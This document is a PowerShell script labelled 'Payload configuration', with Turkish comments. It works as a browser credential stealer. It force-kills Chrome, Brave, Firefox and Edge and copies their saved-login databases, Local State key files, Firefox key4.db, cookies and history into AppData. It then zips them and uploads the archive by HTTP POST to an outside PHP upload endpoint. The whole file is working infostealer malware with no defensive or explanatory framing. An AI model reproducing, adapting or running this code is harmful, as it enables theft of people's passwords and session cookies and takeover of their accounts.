#-- Payload configuration --#

# Set destination directory directly to AppData
$destDir = "$env:APPDATA\BrowserData"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir
            Write-Host "$browserName - File copied: $file"
        } else {
            Write-Host "$browserName - File not found: $file"
        }
    }
}

# Function to kill browser processes
function KillBrowserProcesses($browserName) {
    $processes = Get-Process | Where-Object { $_.Name -like "*$browserName*" }
    foreach ($process in $processes) {
        Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
        Write-Host "Killing process: $browserName with ID: $($process.Id)"
    }
}

# Configuration for Google Chrome
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
KillBrowserProcesses "chrome"
CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue

# Configuration for Brave
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
KillBrowserProcesses "brave"
CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue

# Configuration for Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDir = $firefoxProfile.FullName
    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
    KillBrowserProcesses "firefox"
    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
} else {
    Write-Host "Firefox - No profile found."
}

# Configuration for Microsoft Edge
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeFilesToCopy = @("Login Data")
KillBrowserProcesses "msedge"
CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue

# Klasörü ZIP dosyasına sıkıştırma
$zipDir = "$env:APPDATA\ZippedBrowserData"
if (-Not (Test-Path $zipDir)) {
    New-Item -ItemType Directory -Path $zipDir
}

# Sıkıştırmak istediğiniz klasörün yolu
$folderPath = $destDir

# ZIP dosyasının hedef yolu
$zipFilePath = Join-Path -Path $zipDir -ChildPath "BrowserData.zip"

# Eğer ZIP dosyası zaten varsa, sil
if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath -Force
}

# Klasörü ZIP dosyasına sıkıştırma
Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath

# Yüklemek istediğiniz dosyanın yolu
$zipFilePath = "$env:APPDATA\ZippedBrowserData\BrowserData.zip"  # ZIP dosyasının tam yolu
$url = "https://alperen.cc/uploadd.php"  # PHP dosya yükleme URL'si

if (Test-Path $zipFilePath) {
    try {
        # Multipart form-data oluşturma
        $boundary = [System.Guid]::NewGuid().ToString()
        $contentType = "multipart/form-data; boundary=$boundary"

        # Dosya içeriğini oku
        $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
        $fileName = [System.IO.Path]::GetFileName($zipFilePath)

        # Multipart form-data body oluşturma
        $body = (
            "--$boundary`r`n" +
            "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"`r`n" +
            "Content-Type: application/zip`r`n`r`n" +
            [System.Text.Encoding]::Default.GetString($fileBytes) + "`r`n" +
            "--$boundary--`r`n"
        )

        # POST isteğini gönder
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType $contentType -ErrorAction Stop

        # Yanıtı göster
        Write-Output $response
    } catch {
        Write-Host "Dosya yüklenirken bir hata oluştu: $_. Exception: $($_.Exception.Message)"
    }
} else {
    Write-Host "ZIP dosyası bulunamadı: $zipFilePath"
}
